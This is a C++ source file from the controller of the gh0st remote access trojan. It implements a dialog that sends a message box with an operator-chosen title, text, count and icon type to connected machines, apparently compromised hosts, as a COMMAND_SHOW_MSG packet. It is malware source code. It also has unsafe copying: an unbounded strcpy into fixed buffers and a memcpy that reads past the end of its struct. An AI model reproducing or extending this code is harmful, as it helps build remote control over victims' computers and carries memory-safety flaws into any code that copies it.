// SendMsg.cpp : implementation file
//

#include "stdafx.h"
#include "gh0st.h"
#include "SendMsg.h"
#include "gh0stView.h"

#ifdef _DEBUG
#define new DEBUG_NEW
#undef THIS_FILE
static char THIS_FILE[] = __FILE__;
#endif

extern CGh0stView* g_pConnectView;
/////////////////////////////////////////////////////////////////////////////
// CSendMsg dialog


CSendMsg::CSendMsg(CWnd* pParent /*=NULL*/)
	: CDialog(CSendMsg::IDD, pParent)
{
	//{{AFX_DATA_INIT(CSendMsg)
	m_strTitle = _T("Hello World!");
	m_counts = 1;
	m_edit_msg = _T("2014 is coming, please ask me for Noah's Ark's tickets!");
	//}}AFX_DATA_INIT
}


void CSendMsg::DoDataExchange(CDataExchange* pDX)
{
	CDialog::DoDataExchange(pDX);
	//{{AFX_DATA_MAP(CSendMsg)
	DDX_Control(pDX, IDC_MSG, m_msg);
	DDX_Text(pDX, IDC_EDIT_TITLE, m_strTitle);
	DDX_Text(pDX, IDC_EDIT_COUNTS, m_counts);
	DDX_Text(pDX, IDC_EDIT_MSG, m_edit_msg);
	//}}AFX_DATA_MAP
}


BEGIN_MESSAGE_MAP(CSendMsg, CDialog)
	//{{AFX_MSG_MAP(CSendMsg)
	ON_BN_CLICKED(IDC_SEND_MSG, OnSendMsg)
	//}}AFX_MSG_MAP
END_MESSAGE_MAP()

/////////////////////////////////////////////////////////////////////////////
// CSendMsg message handlers
BOOL CSendMsg::OnInitDialog() 
{
	CDialog::OnInitDialog();

	m_msg.SetCurSel(2);
	
	return TRUE;  // return TRUE unless you set the focus to a control
	// EXCEPTION: OCX Property Pages should return FALSE
}

typedef struct
{
	int counts;
	UINT mark;
	BYTE lpTitle[1024];
    BYTE  lpInfo[1024];
}MsgCom;

void CSendMsg::OnSendMsg() 
{
	// TODO: Add your control notification handler code here
	
	UpdateData(TRUE);
	
	CString edit_msg,msg,modo;
	m_msg.GetWindowText(msg);
	msg.MakeLower();
	
	MsgCom comMsg;	
	memset((char*)&comMsg, 1, sizeof(comMsg));
	comMsg.counts = m_counts;//类控件直接填 int型
	strcpy((char*)&comMsg.lpTitle,m_strTitle.LockBuffer());
	strcpy((char*)&comMsg.lpInfo, m_edit_msg.LockBuffer());
	
	int PackLength = sizeof(MsgCom) +2;
	LPBYTE	lpPacketk = new BYTE[PackLength];
	lpPacketk[0] = COMMAND_SHOW_MSG;
				
	if (msg.Find("普通") != -1)
	{
		comMsg.mark = 1;
	} 
	
	if (msg.Find("询问") != -1)
	{
		comMsg.mark = 2;
	}
	
	if (msg.Find("错误") != -1)
	{
		comMsg.mark = 3;
	}
	
	if (msg.Find("警告") != -1)
	{
		comMsg.mark = 4;
	}
	memcpy(lpPacketk+1, (char*)&comMsg, PackLength-1);
	
	g_pConnectView->SendSelectCommand(lpPacketk, PackLength);
	
	MessageBox("发送消息成功","提示", MB_ICONINFORMATION);	

	delete[] lpPacketk;
}
